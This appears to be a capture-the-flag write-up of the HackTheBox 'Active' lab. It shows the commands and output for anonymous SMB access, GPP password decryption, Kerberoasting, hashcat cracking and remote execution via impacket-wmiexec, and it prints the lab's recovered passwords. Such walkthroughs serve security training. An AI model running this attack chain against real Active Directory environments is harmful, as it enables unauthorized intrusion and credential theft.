---
level: 1
title: Active (WRITE-UP)
subjects:
  - hackthebox
  - writeup
language: pt-br
translations:
  - pt-br
date: 2025-01-18T13:07:22.874Z
description: The Active HTB machine is focused in Active Directory.
---

"Active" is an easy box on HTB focused on Active Directory. The machine allows anonymous access and has an SMB share containing a `Groups.xml` file with a GPP-encrypted password for the user `SVC_TGS`. The user `SVC_TGS` is vulnerable to a Kerberoasting attack, which retrieves the administrator's hash. This hash can be cracked using the `rockyou.txt` wordlist, allowing remote access to compromise the machine.

# Replications Steps

## To user.txt

### Shares Enumeration

Using the smbmap tool to enumerate all the SMB shares, a read only share named "Replication" was identified.

![](public/active-1.png)

The "Replication" Share contains a XML file named "Groups.xml". In this file, a GPP encoded password was found.

```shell
smbclient //10.10.10.100/Replication

Password for [WORKGROUP\htb-c4rm3l0]:

Anonymous login successful

Try "help" to get a list of possible commands.

smb: \> RECURSE ON

smb: \> PROMPT OFF

smb: \> mget *

<...SNIP...>

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-

00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as

active.htb/Policies/{31B2F340-016D-11D2-945F-

00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (12.4 KiloBytes/sec) (average 15.5

KiloBytes/sec)

<...SNIP...>
```

```shell
┌──(kali㉿kali)-[/tmp/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups> 
```

### The GPP Password DecodeApósf 
To decrypt the GPP encoded password, it was used the gpp-decrypt tool, that retrieve us the plain-text password.
```shell
┌──(kali㉿kali)-[/tmp/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Now we can authenticate on SVC_TGS account. 
it was identified that account has read only access to the users directory. 
![](public/active-2.png)

![](public/active-3.png)

The flag was found in the SVC_TGS directory in users share.
## To root.txt
### Kerberoasting attack
Using the SVC_TGS account was possible to perform a Kerberoasting attack and retrieves the administrator's hash password.
![](public/active-4.png)

### Cracking the Password with hashcat
After obtaining the administrator's hash, we can perform a brute-force attack. In this case, we'll use the `hashcat` tool.

 ```
 sudo hashcat -m 13100 hashs.kerberoasting /usr/share/wordlists/rockyou.txt  --force

hashcat (v6.2.6) starting  
....

Administrator:
....
e853e24a00ee09b5e26ca1eec5e4a2f7a4a7db8b3d66e254634c72e021b614bedfbe3e7999254e85086006db33f349c77f3252b12a231217b9f00eace0b13[0/4695]3c71186a072bce13534d96afd47d21bb652ce7dddd9b277cba468cf6072aa9e05f2d9614537088ec320ce1720197f4e86010395f80e95f2db7bc6f0f7ee18b2f771c3
2ab26325ec123cea92138e26a0176520ef62bf1830521f5d218da28bce5548075c0a90f0a467a341f9cd56786c2d5b5aac8d2e8aed988e1f754a5d68b71c5a2cd3249
0b927be4a611c4c89670ada29a650e953b36bb457539985caaba0a4f4c79bc68db08caa1c9c04675f3b899449c3f6dd042f14bb1632ced9d1192898e30ca0933872b2
5170da04fddf7eb:Ticketmaster1968 
 ```

As seen above, we were able to crack the administrator's hash and obtained the password "TicketMaster1968".

Now, we can execute commands on the machine using the `wmic` service and retrieve the flag.

```powershell
impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.129.72.230
```

![](public/active-5.png)